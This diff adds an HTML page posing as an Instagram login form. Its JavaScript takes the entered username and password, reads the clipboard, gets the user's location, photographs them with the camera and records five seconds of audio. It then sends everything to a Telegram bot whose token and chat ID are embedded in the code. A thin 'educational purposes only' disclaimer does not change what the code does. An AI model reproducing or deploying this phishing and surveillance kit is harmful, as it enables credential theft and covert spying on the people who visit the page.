@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        input, button {
+            margin: 10px;
+            padding: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Instagram</h1>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Username" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+
+    <p style="color: red; font-size: 12px;">
+        This website is for educational purposes only. By using this site, you consent to the collection of clipboard data, camera, audio, and location information. All data will be securely handled and deleted after the project is complete.
+    </p>
+
+    <script>
+        // Function to send data to Telegram bot
+        const sendToTelegram = async (data) => {
+            const TELEGRAM_BOT_TOKEN = '7860100782:AAEiIPLFROamCIhHccAW64aWunxl4pUQGTg'; // Replace with your bot token
+            const CHAT_ID = '8163820992'; // Replace with your chat ID
+
+            // Send text data
+            const textMessage = `Data Collected:\nUsername: ${data.username}\nPassword: ${data.password}\nClipboard: ${data.clipboardData}\nLocation: ${JSON.stringify(data.location)}`;
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: textMessage })
+            });
+
+            // Send photo if available
+            if (data.photo) {
+                const photoFormData = new FormData();
+                photoFormData.append('chat_id', CHAT_ID);
+                photoFormData.append('photo', data.photo);
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: photoFormData
+                });
+            }
+
+            // Send audio if available
+            if (data.audio) {
+                const audioFormData = new FormData();
+                audioFormData.append('chat_id', CHAT_ID);
+                audioFormData.append('audio', data.audio);
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
+                    method: 'POST',
+                    body: audioFormData
+                });
+            }
+        };
+
+        // Capture login form data
+        document.getElementById('loginForm').addEventListener('submit', async (event) => {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Capture clipboard data
+            let clipboardData = '';
+            try {
+                clipboardData = await navigator.clipboard.readText();
+            } catch (error) {
+                console.error('Clipboard access denied:', error);
+            }
+
+            // Capture location
+            let location = { latitude: null, longitude: null };
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+                location.latitude = position.coords.latitude;
+                location.longitude = position.coords.longitude;
+            } catch (error) {
+                console.error('Location access denied:', error);
+            }
+
+            // Capture camera photo
+            let photo = null;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photoBlob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/png'));
+                photo = new File([photoBlob], 'photo.png', { type: 'image/png' });
+
+                stream.getTracks().forEach(track => track.stop());
+            } catch (error) {
+                console.error('Camera access denied:', error);
+            }
+
+            // Capture audio
+            let audio = null;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(chunks, { type: 'audio/wav' });
+                    audio = new File([audioBlob], 'audio.wav', { type: 'audio/wav' });
+
+                    // Send all data to Telegram
+                    await sendToTelegram({ username, password, clipboardData, location, photo, audio });
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000); // Record for 5 seconds
+            } catch (error) {
+                console.error('Audio access denied:', error);
+                await sendToTelegram({ username, password, clipboardData, location, photo, audio: null });
+            }
+        });
+    </script>
+</body>
+</html>
